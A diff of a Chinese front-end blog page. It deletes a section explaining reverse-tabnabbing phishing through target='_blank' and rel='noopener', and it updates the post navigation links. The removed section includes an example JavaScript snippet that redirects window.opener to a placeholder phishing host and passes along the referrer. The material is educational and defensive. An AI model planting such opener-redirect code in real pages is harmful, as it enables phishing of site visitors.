@@ -510,25 +510,7 @@
 <p>来自Forrester的Brendan Miller阐述了支付请求API所带来的好处，他说：该新标准让开发者可以创建一个简化的结帐页面，用户可以重复使用保存的付款和地址信息来加快结账速度，并减少错误输入。</p>
 </blockquote>
 <p>Payment Request API的兼容性:<br><img src="https://i.imgur.com/gm6lz5c.png" alt=""></p>
-<h3 id="解决”-blank”的钓鱼攻击"><a href="#解决”-blank”的钓鱼攻击" class="headerlink" title="解决”_blank”的钓鱼攻击"></a>解决”_blank”的钓鱼攻击</h3><blockquote>
-<p>在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。</p>
-<p>然而，就是这个属性，为钓鱼攻击者带来了可乘之机。</p>
-</blockquote>
-<h4 id="parent-与-opener"><a href="#parent-与-opener" class="headerlink" title="parent 与 opener"></a>parent 与 opener</h4><p>在说 <code>opener</code> 之前，可以先聊聊 <code>&lt;iframe&gt;</code> 中的 <code>parent</code>。<br>我们知道，在 <code>&lt;iframe&gt;</code>中提供了一个用于父子页面交互的对象，叫做 <code>window.parent</code>，我们可以通过 <code>window.paren</code>t 对象来从框架中的页面访问父级页面的 <code>window</code>。<br><code>opener</code> 与 <code>parent</code> 一样，只不过是用于 <code>&lt;a target=&quot;_blank&quot;&gt;</code> 在新标签页打开的页面的。通过<br><code>&lt;a target=&quot;_blank&quot;&gt;</code> 打开的页面，可以直接使用 <code>window.opener</code> 来访问来源页面的 <code>window</code> 对象。</p>
-<h4 id="重述攻击步骤"><a href="#重述攻击步骤" class="headerlink" title="重述攻击步骤"></a>重述攻击步骤</h4><p>1.在你的网站 <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> 上存在一个链接：<br>    <a href="https://an.evil.site" target="_blank">进入一个“邪恶”的网站</a></p>
-<p>当用户点击了这个链接，在新的标签页打开了这个网站。这个网站上只要包含着类似于这样的 JavaScript 代码：</p>
-<pre><code>&lt;script type=&apos;text/javascript&apos;&gt;
-if  (window.opener)  {
-  window.opener.location  =  &apos;http://www.two.com/phishing-referrer=&apos;+document.referrer;
-}
-&lt;/script&gt;
-</code></pre><p>那么此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 <code>https://a.fake.site/?https%3A%2F%2Fexample.com%2F</code></p>
-<p>恶意网站 <a href="https://a.fake.site" target="_blank" rel="noopener">https://a.fake.site</a> 根据 <code>Query String</code> 来伪造一个足以欺骗用户的页面，并展示出来(期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性)。</p>
-<p>用户关闭 <code>https://an.evil.site</code> 的标签页，回到原来的网站………………已经回不去了。</p>
-<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>为了安全，现代浏览器都支持在 <a> 标签的 rel 属性中指定 rel=”noopener”，这样，在打开的新标签页中，将无法再使用 <code>opener</code> 对象了，它为设置为了 null。</a></p>
-<pre><code>&lt;a href=&quot;https://an.evil.site&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;进入一个“邪恶”的网站&lt;/a&gt;
-</code></pre><h5 id="性能问题。"><a href="#性能问题。" class="headerlink" title="性能问题。"></a>性能问题。</h5><p>如果网站使用了 <code>&lt;a target=&quot;_blank&quot;&gt;</code>，那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的 <code>JavaScript</code> 脚本，那么原始标签页也会受到影响，会出现卡顿的现象（当然不至于卡死）。<br>而如果在链接中加入了 <code>noopener</code>，则此时两个标签页将会互不干扰，使得原页面的性能不会受到新页面的影响。</p>
-
+<h3 id="解决”-blank”的钓鱼攻击"><a href="#解决”-blank”的钓鱼攻击" class="headerlink" title="解决”_blank”的钓鱼攻击"></a>解决”_blank”的钓鱼攻击</h3>
         </div>
     
 </div>
@@ -549,13 +531,21 @@ if  (window.opener)  {
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
+        <a href="/2018/03/08/被严重低估的target-blank-漏洞问题/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/03/08/你知道吗-浏览器也有数据库/" id="post_nav-older" class="next-content">
+        <a href="/2018/02/27/移动设备引发的一像素边框问题/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
